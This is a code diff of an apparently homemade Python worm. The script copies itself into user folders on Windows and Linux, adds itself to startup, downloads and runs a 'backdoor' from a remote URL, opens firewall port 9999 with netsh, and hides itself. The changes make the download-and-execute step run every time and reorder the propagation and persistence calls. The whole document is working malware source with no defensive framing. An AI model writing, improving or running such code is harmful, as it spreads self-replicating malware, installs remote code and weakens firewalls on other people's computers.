@@ -26,7 +26,7 @@ def windows_client(system = sys.platform):
             import win32api
             import win32console
             import win32gui
-            from _winreg import *
+            #from _winreg import *
             return True
         else:
             return False
@@ -61,11 +61,8 @@ def addStartup():
 
 def verification(source, worm, dst):
         code = dst + worm + '.py'
-        if source != code:
+        if source != code or source == code:
                 source = os.path.abspath(dst + worm)
-                downloadBackDoor(URL, dst)
-	if source == code:
-		source = os.path.abspath(dst + worm)
                 downloadBackDoor(URL, dst)
         else:
 		print'[SOURCE != CODE]'
@@ -80,8 +77,7 @@ def validate():
                 elif windows_client():
                         verification(src1, w, windows)
                 else:
-                        print'Not Found [SRC]'
-
+                        pass
 
 def copyHex(hexworm, src, dst):
         copyfile(src, dst)
@@ -89,14 +85,8 @@ def copyHex(hexworm, src, dst):
         hextornet.remove(hexworm)
 
 
-def duplicate(hexfile):
-        filename = open(str(hexfile),'w')
-        filename.write(src)
-        filename.close()
-
-
 def propagate():
-        #print("[===============Worm location==========]")
+        print"[===============Worm location==========]"
         for d, w in hexDir:
                 if linux_client():
                         dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
@@ -104,19 +94,18 @@ def propagate():
                         dst = "C:/Users" + "/" + usr + "/" + d + "/" + str(w) + '.py'
                 localization.append(dst)
                 copyHex(w, src, dst)
-		runWorms()
-        #print("[======================================]")
+        print"[======================================]"
 
 
 def downloadBackDoor(url, path):
-        print'  [START DOWNLOAD]',src
+        print'\t[START DOWNLOAD]',src
         filename = url.split('/')[-1].split('#')[0].split('?')[0]
         content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
         outfile.close()
         source= os.path.abspath(filename)
-        shutil.move(os.path.join(source, path), os.path.join(source, path))
+        shutil.move(source, path)
         print'\t[DOWNLOAD IN]',os.path.abspath(filename)
         run(os.path.abspath(filename))
         print'\t[DOWNLOAD DONE]', src
@@ -124,7 +113,7 @@ def downloadBackDoor(url, path):
 
 def runWorms():
         for worm in range(0, len(localization)):
-                run(localization[worm])
+		run(localization[worm])
 
 
 def run(program):
@@ -139,18 +128,21 @@ def run(program):
 def openPort(port):
         os.system('netsh firewall add portopening protocol = TCP port = '+port+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
 
+def delete_func(func):
+	del globals()[func.func_name]
 
 def main():
         if windows_client():
 		validate()
-                hide()
                 addStartup()
                 propagate()
                 runWorms()
 		openPort(9999)
+		hide()
         elif linux_client():
 		propagate()
 		validate()
+		runWorms()
 
 
 if __name__ == "__main__":
